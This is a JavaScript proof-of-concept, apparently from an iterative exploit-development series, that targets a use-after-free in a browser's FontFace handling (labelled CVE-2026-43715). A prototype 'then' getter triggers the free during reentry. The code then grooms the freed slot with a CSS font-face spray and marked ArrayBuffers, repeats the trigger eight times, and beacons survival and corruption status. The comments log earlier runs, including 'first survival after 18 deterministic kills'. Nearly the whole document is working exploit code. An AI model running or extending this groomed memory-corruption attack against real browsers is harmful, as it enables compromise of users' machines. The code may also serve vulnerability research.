// p449 — CVE-2026-43715 Stage 2: repeated groomed triggers + state readback
// Beacon prefix: V449-
//
// p448 (3/3): SURVIVED. Tight per-item spray (style + text sink +
// offsetHeight per face, 120 iterations, immediately after the free)
// places a real object in the freed client's slot; the loop's virtual
// call dispatches harmlessly. First survival after 18 deterministic
// kills (p445/p446). CLEAN both scans: no engine writes into the
// ArrayBuffer filler.
//
// v449 repeats the groomed trigger up to 8 times in one page load:
//   - each round is the p448 recipe verbatim (fresh victim, CSS-created
//     face, then-getter reentry, tight spray)
//   - after each round, read back the STATUS of every sprayed face —
//     if a type-confused fontLoaded() landed on one of them, its state
//     may diverge from the expected loaded/error pattern
//   - SURVIVED-n with rising n proves repeatable, groomable corruption
//
// Expected healthy spray status: "loaded" (local Helvetica resolves).
// Anything else — especially after the trigger — is the fingerprint.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V449-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 100));
    return false;
  };

  var SRC = 'local(Helvetica)';
  var sprayAB = [];
  var hits = 0;
  var roundNo = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here

        // Tight spray — the p448 known-good groom, verbatim.
        for (var k = 0; k < 120; k++) {
          var fam = 't' + hits + 'x' + k;
          var st = document.createElement('style');
          st.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
          document.head.appendChild(st);
          var d = document.createElement('div');
          d.style.fontFamily = fam;
          d.textContent = 'A';
          document.body.appendChild(d);
          document.body.offsetHeight;    // immediate allocation
        }

        var SIZES = [64, 96, 128, 192, 256, 384, 512];
        for (var s = 0; s < SIZES.length; s++) {
          for (var n = 0; n < 16; n++) {
            var u8 = new Uint8Array(new ArrayBuffer(SIZES[s]));
            for (var i = 0; i < u8.length; i += 8) {
              u8[i] = 0x49; u8[i+1] = 0x34; u8[i+2] = 0x34; u8[i+3] = 0x56;
            }
            sprayAB.push(u8);
          }
        }
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function scan() {
    var dirty = 0, ex = '';
    for (var k = 0; k < sprayAB.length; k++) {
      var u8 = sprayAB[k];
      for (var i = 0; i < u8.length; i += 8) {
        if (u8[i] !== 0x49 || u8[i+1] !== 0x34 || u8[i+2] !== 0x34 ||
            u8[i+3] !== 0x56) {
          dirty++;
          if (ex.length < 160)
            ex += 'k' + k + '@' + i + ':' + u8[i].toString(16) +
              u8[i+1].toString(16) + u8[i+2].toString(16) + u8[i+3].toString(16) + ' ';
          break;
        }
      }
    }
    if (dirty) B('DIRTY-' + dirty + '-' + encodeURIComponent(ex));
    else B('CLEAN');
  }

  // Status census of every face in document.fonts, current round's
  // sprayed prefix onward. "t" families are spray; "g" is the trigger.
  function statCensus(tag) {
    var c = {};
    document.fonts.forEach(function(f) {
      var fam = f.family.replace(/['"]/g, '');
      if (fam[0] === 't' || fam[0] === 'g') {
        var s = f.status;
        c[s] = (c[s] || 0) + 1;
      }
    });
    var parts = [];
    for (var k in c) parts.push(k + ':' + c[k]);
    B(tag + '-STAT[' + parts.join(',') + ']');
  }

  function round(i) {
    roundNo = i;
    var fam = 'g' + i;

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var faces = [];
    document.fonts.forEach(function(f) { faces.push(f); });
    var face = faces.find(function(f) {
      return f.family.replace(/['"]/g, '') === fam;
    });
    if (!face) { B('NOFACE-' + i); return; }

    void face.loaded;
    B('LOAD-' + i);

    face.load().then(
      function() {
        B('SURVIVED-' + i + '-H' + hits);
        statCensus('R' + i);
        scan();
        sprayAB = [];   // reset filler; CSS spray stays (live objects)
      },
      function(e) { B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  var i = 0;
  (function step() {
    if (i >= 8) { B('ALLDONE-H' + hits); statCensus('FINAL'); return; }
    round(i); i++;
    setTimeout(step, 500);
  })();

  setTimeout(function() { B('ALIVE-5S-H' + hits); statCensus('T5'); scan(); }, 5000);
  setTimeout(function() { B('ALIVE-10S-H' + hits); }, 10000);
})();
